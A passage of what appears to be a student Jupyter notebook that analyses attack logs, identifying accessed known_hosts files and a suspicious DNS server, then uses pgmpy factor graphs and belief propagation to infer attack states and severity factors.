    "oslogs_query[oslogs_query['columns.target_path'].str.contains('host')==True]['columns.target_path'].unique()\n",
    "####The file name is known_hosts"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "array(['/etc/dbus-1/system.d/org.freedesktop.hostname1.conf.dpkg-new',\n",
       "       '/root/.ssh/known_hosts', '/root/.ssh/.known_hosts.swp',\n",
       "       '/root/.ssh/.known_hosts.swpx', '/root/.ssh/known_hosts~'],\n",
       "      dtype=object)"
      ]
     },
     "execution_count": 25,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "oslogs_query[oslogs_query['columns.target_path'].str.contains('host')==True]['columns.target_path'].unique()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<b>Task 1.3c"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<b>File name is known_hosts"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "No the attacker didnt extract any hostnames\n"
     ]
    }
   ],
   "source": [
    "http_df['content_type'].str.contains('known_hosts').sum()\n",
    "print(\"No the attacker didnt extract any hostnames\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<b>Task 1.4a"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "array(['22', '55595', '43204', '53', '47184', '45204', 'NA', '47111',\n",
       "       '51949', '60816', '36048', '58999', '53523', '57996', '43790',\n",
       "       '46118', '35552', '54157', '50018', '50020', '47298', '42076',\n",
       "       '40152', '46304', '443', '80', '54374', '46538', '33404', '43917'],\n",
       "      dtype=object)"
      ]
     },
     "execution_count": 27,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "dns_df['Source_port'].unique() #We could see the port 53 in this dns server"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 28,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "array(['10.0.2.15'], dtype=object)"
      ]
     },
     "execution_count": 28,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "dns_df[dns_df['Source_port']=='53']['dest_ip'].unique()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 29,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "array(['162.212.156.148', '75.75.75.75'], dtype=object)"
      ]
     },
     "execution_count": 29,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "dns_df[dns_df['Source_port']=='53']['src_host'].unique()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<b>Attacker DNS server is 162.212.156.148<br>\n",
    "Legitimate DNS server is 10.0.2.15"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<b>Task 1.4b"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 30,
   "metadata": {},
   "outputs": [
    {
     "ename": "RuntimeError",
     "evalue": "Selected KDE bandwidth is 0. Cannot estimate density.",
     "output_type": "error",
     "traceback": [
      "\u001b[1;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[1;31mValueError\u001b[0m                                Traceback (most recent call last)",
      "\u001b[1;32md:\\cs 498\\mp3\\498ds_mp3\\lib\\site-packages\\statsmodels\\nonparametric\\kde.py\u001b[0m in \u001b[0;36mkdensityfft\u001b[1;34m(X, kernel, bw, weights, gridsize, adjust, clip, cut, retgrid)\u001b[0m\n\u001b[0;32m    450\u001b[0m     \u001b[1;32mtry\u001b[0m\u001b[1;33m:\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[1;32m--> 451\u001b[1;33m         \u001b[0mbw\u001b[0m \u001b[1;33m=\u001b[0m \u001b[0mfloat\u001b[0m\u001b[1;33m(\u001b[0m\u001b[0mbw\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0m\u001b[0;32m    452\u001b[0m     \u001b[1;32mexcept\u001b[0m\u001b[1;33m:\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n",
      "\u001b[1;31mValueError\u001b[0m: could not convert string to float: 'scott'",
      "\nDuring handling of the above exception, another exception occurred:\n",
      "\u001b[1;31mRuntimeError\u001b[0m                              Traceback (most recent call last)",
      "\u001b[1;32m<ipython-input-30-4b1b07f01c69>\u001b[0m in \u001b[0;36m<module>\u001b[1;34m\u001b[0m\n\u001b[0;32m      1\u001b[0m \u001b[0msns\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0mdistplot\u001b[0m\u001b[1;33m(\u001b[0m \u001b[0mdns_df\u001b[0m\u001b[1;33m[\u001b[0m\u001b[0mdns_df\u001b[0m\u001b[1;33m[\u001b[0m\u001b[1;34m'dest_ip'\u001b[0m\u001b[1;33m]\u001b[0m\u001b[1;33m==\u001b[0m\u001b[1;34m'162.212.156.148'\u001b[0m\u001b[1;33m]\u001b[0m\u001b[1;33m[\u001b[0m\u001b[1;34m'length'\u001b[0m\u001b[1;33m]\u001b[0m \u001b[1;33m,\u001b[0m \u001b[0mcolor\u001b[0m\u001b[1;33m=\u001b[0m\u001b[1;34m\"black\"\u001b[0m\u001b[1;33m,\u001b[0m \u001b[0mlabel\u001b[0m\u001b[1;33m=\u001b[0m\u001b[1;34m\"162.212.156.148\"\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[1;32m----> 2\u001b[1;33m \u001b[0msns\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0mdistplot\u001b[0m\u001b[1;33m(\u001b[0m \u001b[0mdns_df\u001b[0m\u001b[1;33m[\u001b[0m\u001b[0mdns_df\u001b[0m\u001b[1;33m[\u001b[0m\u001b[1;34m'src_host'\u001b[0m\u001b[1;33m]\u001b[0m\u001b[1;33m==\u001b[0m\u001b[1;34m'10.0.2.2'\u001b[0m\u001b[1;33m]\u001b[0m\u001b[1;33m[\u001b[0m\u001b[1;34m'length'\u001b[0m\u001b[1;33m]\u001b[0m \u001b[1;33m,\u001b[0m \u001b[0mcolor\u001b[0m\u001b[1;33m=\u001b[0m\u001b[1;34m\"red\"\u001b[0m\u001b[1;33m,\u001b[0m \u001b[0mlabel\u001b[0m\u001b[1;33m=\u001b[0m\u001b[1;34m\"10.0.2.2\"\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0m\u001b[0;32m      3\u001b[0m \u001b[0mplt\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0mtitle\u001b[0m\u001b[1;33m(\u001b[0m\u001b[1;34m\"Distribution of DNS length Queries for Attacker and legitimate servers\"\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m      4\u001b[0m \u001b[0mplt\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0mylabel\u001b[0m\u001b[1;33m(\u001b[0m\u001b[1;34m\"probability distribution\"\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m      5\u001b[0m \u001b[0mplt\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0mlegend\u001b[0m\u001b[1;33m(\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n",
      "\u001b[1;32md:\\cs 498\\mp3\\498ds_mp3\\lib\\site-packages\\seaborn\\distributions.py\u001b[0m in \u001b[0;36mdistplot\u001b[1;34m(a, bins, hist, kde, rug, fit, hist_kws, kde_kws, rug_kws, fit_kws, color, vertical, norm_hist, axlabel, label, ax)\u001b[0m\n\u001b[0;32m    231\u001b[0m     \u001b[1;32mif\u001b[0m \u001b[0mkde\u001b[0m\u001b[1;33m:\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m    232\u001b[0m         \u001b[0mkde_color\u001b[0m \u001b[1;33m=\u001b[0m \u001b[0mkde_kws\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0mpop\u001b[0m\u001b[1;33m(\u001b[0m\u001b[1;34m\"color\"\u001b[0m\u001b[1;33m,\u001b[0m \u001b[0mcolor\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[1;32m--> 233\u001b[1;33m         \u001b[0mkdeplot\u001b[0m\u001b[1;33m(\u001b[0m\u001b[0ma\u001b[0m\u001b[1;33m,\u001b[0m \u001b[0mvertical\u001b[0m\u001b[1;33m=\u001b[0m\u001b[0mvertical\u001b[0m\u001b[1;33m,\u001b[0m \u001b[0max\u001b[0m\u001b[1;33m=\u001b[0m\u001b[0max\u001b[0m\u001b[1;33m,\u001b[0m \u001b[0mcolor\u001b[0m\u001b[1;33m=\u001b[0m\u001b[0mkde_color\u001b[0m\u001b[1;33m,\u001b[0m \u001b[1;33m**\u001b[0m\u001b[0mkde_kws\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0m\u001b[0;32m    234\u001b[0m         \u001b[1;32mif\u001b[0m \u001b[0mkde_color\u001b[0m \u001b[1;33m!=\u001b[0m \u001b[0mcolor\u001b[0m\u001b[1;33m:\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m    235\u001b[0m             \u001b[0mkde_kws\u001b[0m\u001b[1;33m[\u001b[0m\u001b[1;34m\"color\"\u001b[0m\u001b[1;33m]\u001b[0m \u001b[1;33m=\u001b[0m \u001b[0mkde_color\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n",
      "\u001b[1;32md:\\cs 498\\mp3\\498ds_mp3\\lib\\site-packages\\seaborn\\distributions.py\u001b[0m in \u001b[0;36mkdeplot\u001b[1;34m(data, data2, shade, vertical, kernel, bw, gridsize, cut, clip, legend, cumulative, shade_lowest, cbar, cbar_ax, cbar_kws, ax, **kwargs)\u001b[0m\n\u001b[0;32m    703\u001b[0m         ax = _univariate_kdeplot(data, shade, vertical, kernel, bw,\n\u001b[0;32m    704\u001b[0m                                  \u001b[0mgridsize\u001b[0m\u001b[1;33m,\u001b[0m \u001b[0mcut\u001b[0m\u001b[1;33m,\u001b[0m \u001b[0mclip\u001b[0m\u001b[1;33m,\u001b[0m \u001b[0mlegend\u001b[0m\u001b[1;33m,\u001b[0m \u001b[0max\u001b[0m\u001b[1;33m,\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[1;32m--> 705\u001b[1;33m                                  cumulative=cumulative, **kwargs)\n\u001b[0m\u001b[0;32m    706\u001b[0m \u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m    707\u001b[0m     \u001b[1;32mreturn\u001b[0m \u001b[0max\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n",
      "\u001b[1;32md:\\cs 498\\mp3\\498ds_mp3\\lib\\site-packages\\seaborn\\distributions.py\u001b[0m in \u001b[0;36m_univariate_kdeplot\u001b[1;34m(data, shade, vertical, kernel, bw, gridsize, cut, clip, legend, ax, cumulative, **kwargs)\u001b[0m\n\u001b[0;32m    293\u001b[0m         x, y = _statsmodels_univariate_kde(data, kernel, bw,\n\u001b[0;32m    294\u001b[0m                                            \u001b[0mgridsize\u001b[0m\u001b[1;33m,\u001b[0m \u001b[0mcut\u001b[0m\u001b[1;33m,\u001b[0m \u001b[0mclip\u001b[0m\u001b[1;33m,\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[1;32m--> 295\u001b[1;33m                                            cumulative=cumulative)\n\u001b[0m\u001b[0;32m    296\u001b[0m     \u001b[1;32melse\u001b[0m\u001b[1;33m:\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m    297\u001b[0m         \u001b[1;31m# Fall back to scipy if missing statsmodels\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n",
      "\u001b[1;32md:\\cs 498\\mp3\\498ds_mp3\\lib\\site-packages\\seaborn\\distributions.py\u001b[0m in \u001b[0;36m_statsmodels_univariate_kde\u001b[1;34m(data, kernel, bw, gridsize, cut, clip, cumulative)\u001b[0m\n\u001b[0;32m    365\u001b[0m     \u001b[0mfft\u001b[0m \u001b[1;33m=\u001b[0m \u001b[0mkernel\u001b[0m \u001b[1;33m==\u001b[0m \u001b[1;34m\"gau\"\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m    366\u001b[0m     \u001b[0mkde\u001b[0m \u001b[1;33m=\u001b[0m \u001b[0msmnp\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0mKDEUnivariate\u001b[0m\u001b[1;33m(\u001b[0m\u001b[0mdata\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[1;32m--> 367\u001b[1;33m     \u001b[0mkde\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0mfit\u001b[0m\u001b[1;33m(\u001b[0m\u001b[0mkernel\u001b[0m\u001b[1;33m,\u001b[0m \u001b[0mbw\u001b[0m\u001b[1;33m,\u001b[0m \u001b[0mfft\u001b[0m\u001b[1;33m,\u001b[0m \u001b[0mgridsize\u001b[0m\u001b[1;33m=\u001b[0m\u001b[0mgridsize\u001b[0m\u001b[1;33m,\u001b[0m \u001b[0mcut\u001b[0m\u001b[1;33m=\u001b[0m\u001b[0mcut\u001b[0m\u001b[1;33m,\u001b[0m \u001b[0mclip\u001b[0m\u001b[1;33m=\u001b[0m\u001b[0mclip\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0m\u001b[0;32m    368\u001b[0m     \u001b[1;32mif\u001b[0m \u001b[0mcumulative\u001b[0m\u001b[1;33m:\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m    369\u001b[0m         \u001b[0mgrid\u001b[0m\u001b[1;33m,\u001b[0m \u001b[0my\u001b[0m \u001b[1;33m=\u001b[0m \u001b[0mkde\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0msupport\u001b[0m\u001b[1;33m,\u001b[0m \u001b[0mkde\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0mcdf\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n",
      "\u001b[1;32md:\\cs 498\\mp3\\498ds_mp3\\lib\\site-packages\\statsmodels\\nonparametric\\kde.py\u001b[0m in \u001b[0;36mfit\u001b[1;34m(self, kernel, bw, fft, weights, gridsize, adjust, cut, clip)\u001b[0m\n\u001b[0;32m    138\u001b[0m             density, grid, bw = kdensityfft(endog, kernel=kernel, bw=bw,\n\u001b[0;32m    139\u001b[0m                     \u001b[0madjust\u001b[0m\u001b[1;33m=\u001b[0m\u001b[0madjust\u001b[0m\u001b[1;33m,\u001b[0m \u001b[0mweights\u001b[0m\u001b[1;33m=\u001b[0m\u001b[0mweights\u001b[0m\u001b[1;33m,\u001b[0m \u001b[0mgridsize\u001b[0m\u001b[1;33m=\u001b[0m\u001b[0mgridsize\u001b[0m\u001b[1;33m,\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[1;32m--> 140\u001b[1;33m                     clip=clip, cut=cut)\n\u001b[0m\u001b[0;32m    141\u001b[0m         \u001b[1;32melse\u001b[0m\u001b[1;33m:\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m    142\u001b[0m             density, grid, bw = kdensity(endog, kernel=kernel, bw=bw,\n",
      "\u001b[1;32md:\\cs 498\\mp3\\498ds_mp3\\lib\\site-packages\\statsmodels\\nonparametric\\kde.py\u001b[0m in \u001b[0;36mkdensityfft\u001b[1;34m(X, kernel, bw, weights, gridsize, adjust, clip, cut, retgrid)\u001b[0m\n\u001b[0;32m    451\u001b[0m         \u001b[0mbw\u001b[0m \u001b[1;33m=\u001b[0m \u001b[0mfloat\u001b[0m\u001b[1;33m(\u001b[0m\u001b[0mbw\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m    452\u001b[0m     \u001b[1;32mexcept\u001b[0m\u001b[1;33m:\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[1;32m--> 453\u001b[1;33m         \u001b[0mbw\u001b[0m \u001b[1;33m=\u001b[0m \u001b[0mbandwidths\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0mselect_bandwidth\u001b[0m\u001b[1;33m(\u001b[0m\u001b[0mX\u001b[0m\u001b[1;33m,\u001b[0m \u001b[0mbw\u001b[0m\u001b[1;33m,\u001b[0m \u001b[0mkern\u001b[0m\u001b[1;33m)\u001b[0m \u001b[1;31m# will cross-val fit this pattern?\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0m\u001b[0;32m    454\u001b[0m     \u001b[0mbw\u001b[0m \u001b[1;33m*=\u001b[0m \u001b[0madjust\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m    455\u001b[0m \u001b[1;33m\u001b[0m\u001b[0m\n",
      "\u001b[1;32md:\\cs 498\\mp3\\498ds_mp3\\lib\\site-packages\\statsmodels\\nonparametric\\bandwidths.py\u001b[0m in \u001b[0;36mselect_bandwidth\u001b[1;34m(x, bw, kernel)\u001b[0m\n\u001b[0;32m    172\u001b[0m         \u001b[1;31m# eventually this can fall back on another selection criterion.\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m    173\u001b[0m         \u001b[0merr\u001b[0m \u001b[1;33m=\u001b[0m \u001b[1;34m\"Selected KDE bandwidth is 0. Cannot estimate density.\"\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[1;32m--> 174\u001b[1;33m         \u001b[1;32mraise\u001b[0m \u001b[0mRuntimeError\u001b[0m\u001b[1;33m(\u001b[0m\u001b[0merr\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0m\u001b[0;32m    175\u001b[0m     \u001b[1;32melse\u001b[0m\u001b[1;33m:\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m    176\u001b[0m         \u001b[1;32mreturn\u001b[0m \u001b[0mbandwidth\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n",
      "\u001b[1;31mRuntimeError\u001b[0m: Selected KDE bandwidth is 0. Cannot estimate density."
     ]
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 432x288 with 1 Axes>"
      ]
     },
     "metadata": {
      "needs_background": "light"
     },
     "output_type": "display_data"
    }
   ],
   "source": [
    "sns.distplot( dns_df[dns_df['dest_ip']=='162.212.156.148']['length'] , color=\"black\", label=\"162.212.156.148\")\n",
    "sns.distplot( dns_df[dns_df['src_host']=='10.0.2.2']['length'] , color=\"red\", label=\"10.0.2.2\")\n",
    "plt.title(\"Distribution of DNS length Queries for Attacker and legitimate servers\")\n",
    "plt.ylabel(\"probability distribution\")\n",
    "plt.legend()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "collapsed": true
   },
   "source": [
    "<b> Task 2 "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<b> Task 2.1 -Defining the factor graph </b>"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 31,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Requirement already satisfied: pgmpy in d:\\cs 498\\mp3\\498ds_mp3\\lib\\site-packages (0.1.10)\n",
      "Requirement already satisfied: tqdm in d:\\cs 498\\mp3\\498ds_mp3\\lib\\site-packages (from pgmpy) (4.45.0)\n",
      "Requirement already satisfied: joblib in d:\\cs 498\\mp3\\498ds_mp3\\lib\\site-packages (from pgmpy) (0.14.1)\n",
      "Requirement already satisfied: scipy in d:\\cs 498\\mp3\\498ds_mp3\\lib\\site-packages (from pgmpy) (1.4.1)\n",
      "Requirement already satisfied: pandas in d:\\cs 498\\mp3\\498ds_mp3\\lib\\site-packages (from pgmpy) (1.0.3)\n",
      "Requirement already satisfied: statsmodels in d:\\cs 498\\mp3\\498ds_mp3\\lib\\site-packages (from pgmpy) (0.11.1)\n",
      "Requirement already satisfied: numpy in d:\\cs 498\\mp3\\498ds_mp3\\lib\\site-packages (from pgmpy) (1.18.2)\n",
      "Requirement already satisfied: torch in d:\\cs 498\\mp3\\498ds_mp3\\lib\\site-packages (from pgmpy) (1.4.0+cpu)\n",
      "Requirement already satisfied: pyparsing in d:\\cs 498\\mp3\\498ds_mp3\\lib\\site-packages (from pgmpy) (2.4.6)\n",
      "Requirement already satisfied: networkx in d:\\cs 498\\mp3\\498ds_mp3\\lib\\site-packages (from pgmpy) (2.4)\n",
      "Requirement already satisfied: python-dateutil>=2.6.1 in d:\\cs 498\\mp3\\498ds_mp3\\lib\\site-packages (from pandas->pgmpy) (2.8.1)\n",
      "Requirement already satisfied: pytz>=2017.2 in d:\\cs 498\\mp3\\498ds_mp3\\lib\\site-packages (from pandas->pgmpy) (2019.3)\n",
      "Requirement already satisfied: patsy>=0.5 in d:\\cs 498\\mp3\\498ds_mp3\\lib\\site-packages (from statsmodels->pgmpy) (0.5.1)\n",
      "Requirement already satisfied: decorator>=4.3.0 in d:\\cs 498\\mp3\\498ds_mp3\\lib\\site-packages (from networkx->pgmpy) (4.4.2)\n",
      "Requirement already satisfied: six>=1.5 in d:\\cs 498\\mp3\\498ds_mp3\\lib\\site-packages (from python-dateutil>=2.6.1->pandas->pgmpy) (1.14.0)\n"
     ]
    }
   ],
   "source": [
    "!pip install pgmpy"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 31,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "###Importing the necessary libraries \n",
    "import numpy as np\n",
    "import pandas as pd\n",
    "from pgmpy.factors.discrete import DiscreteFactor\n",
    "from pgmpy.models import FactorGraph\n",
    "from pgmpy.inference import BeliefPropagation\n",
    "import networkx as nx\n",
    "import matplotlib.pyplot as plt"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<b>Task 2.1"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 32,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      " The value of the partition function Z is 0.33 which can be validated by using the formula.\n",
      " Hence the Factor Graph is correctly defined and we can proceed\n"
     ]
    }
   ],
   "source": [
    "G = FactorGraph()\n",
    "G.add_nodes_from(['S1','E1'])\n",
    "f_1 = DiscreteFactor(variables=['S1','E1'],cardinality=[2,2],values=np.array([0.1,0.2,0.0,0.5]).reshape(4,1))\n",
    "f_2 = DiscreteFactor(variables=['S1'],cardinality=[2],values=np.array([0.85,0.15]).reshape(2,1))\n",
    "G.add_factors(f_1,f_2)\n",
    "G.add_nodes_from(['S1' , 'E1'])\n",
    "G.add_edges_from([('S1',f_2 ), ('S1', f_1),('E1',f_1)])\n",
    "print(f' The value of the partition function Z is {G.get_partition_function()} which can be validated by using the formula.\\n Hence the Factor Graph is correctly defined and we can proceed')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<b> Task 2.2 - Calculating the Marginal probability P(S1) </b>"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 33,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "Eliminating: E1: 100%|██████████████████████████████████████████████████████████████████| 1/1 [00:00<00:00, 337.08it/s]"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "+-------+-----------+\n",
      "| S1    |   phi(S1) |\n",
      "+=======+===========+\n",
      "| S1(0) |    0.7727 |\n",
      "+-------+-----------+\n",
      "| S1(1) |    0.2273 |\n",
      "+-------+-----------+\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "\n"
     ]
    }
   ],
   "source": [
    "bp = BeliefPropagation(G)\n",
    "margin=bp.query(variables=['S1'],joint=False)\n",
    "print(margin['S1'])"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<b> Task 2.3  </b>"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "From the above table it can be infered that the value of <b> S1=0 (No attack)</b> maximizes the marginal probability- P(S1)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<b> Task 2.4 -the probability  P(S1) when E1=1 is observed </b>"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 34,
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "0it [00:00, ?it/s]"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "+-------+-----------+\n",
      "| S1    |   phi(S1) |\n",
      "+=======+===========+\n",
      "| S1(0) |    0.6939 |\n",
      "+-------+-----------+\n",
      "| S1(1) |    0.3061 |\n",
      "+-------+-----------+\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "\n"
     ]
    }
   ],
   "source": [
    "bp = BeliefPropagation(G)\n",
    "margin=bp.query(variables=['S1'],evidence={'E1':1},joint=False)\n",
    "print(margin['S1'])"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<b> Task 2.5 </b>"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "From the above table it can be infered that the value of <b> S1=0 (No attack) </b> is the most probable state when we observe E1=1 "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<b> Task 2.6 - Verification of the results in Task 2.2 and 2.4 manually </b> "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 35,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "########### To de done afterwards"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<b> Task 3 </b>"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<b> Subtask 3.0 - Creating  the severity function f1 to  f9 </b>"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 36,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "def severity_factor(observed_events,states,factors,severity_factor_functions):\n",
    "    \"\"\"\n",
    "    Summary:\n",
    "    \n",
    "    This function will extract the probability of each state value given an observed event\n",
    "    \n",
    "    Parameters: \n",
    "    observed_events : a list contaning all the observed events \n",
    "    states : All the possible values each state can take\n",
    "    factors : a list with the names of all factor functions from f1 to f9\n",
    "    severity_factor_functions : an empty dictionary to hold all the factor functions \n",
    "\n",
    "    Returns: \n",
    "    All the factor functions in the dictionary severity_factor_functions\n",
    "\n",
    "    \"\"\"\n",
    "    delta=-1\n",
    "    for i in observed_events.values():\n",
    "        delta+=1\n",
    "        for j in states:\n",
    "            counter=0\n",
    "            flag=0\n",
    "            with open('D:\\CS 498\\mp3\\event_review.txt','r') as f:\n",
    "                while True:\n",
    "                    content = f.readline()\n",
    "                    if not content:\n",
    "                        break\n",
    "                    line=content.split('//')\n",
    "                    if i in line[0] and j in line[1]:\n",
    "                        counter+=1\n",
    "                        flag+=1\n",
    "                    elif i in line[0]:\n",
    "                        flag+=1\n",
    "                    else:\n",
    "                        continue\n",
    "    #             print(i,j)\n",
    "    #             print(counter,flag)\n",
    "                try:\n",
    "                    severity_factor_functions[factors[delta]].append(counter/flag)\n",
    "                except:\n",
    "                    severity_factor_functions[factors[delta]].append(0)\n",
    "    return severity_factor_functions\n",
    "    "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 37,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{'f1': [0.936, 0.064, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0],\n",
       " 'f2': [1.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0],\n",
       " 'f3': [0.5533333333333333,\n",
       "  0.0,\n",
       "  0.0,\n",
       "  0.0,\n",
       "  0.44666666666666666,\n",
       "  0.0,\n",
       "  0.0,\n",
       "  0.0,\n",
       "  0.0,\n",
       "  0.0,\n",
       "  0.0],\n",
       " 'f4': [0.5533333333333333,\n",
       "  0.0,\n",
       "  0.0,\n",
       "  0.0,\n",
       "  0.44666666666666666,\n",
       "  0.0,\n",
       "  0.0,\n",
       "  0.0,\n",
       "  0.0,\n",
       "  0.0,\n",
       "  0.0],\n",
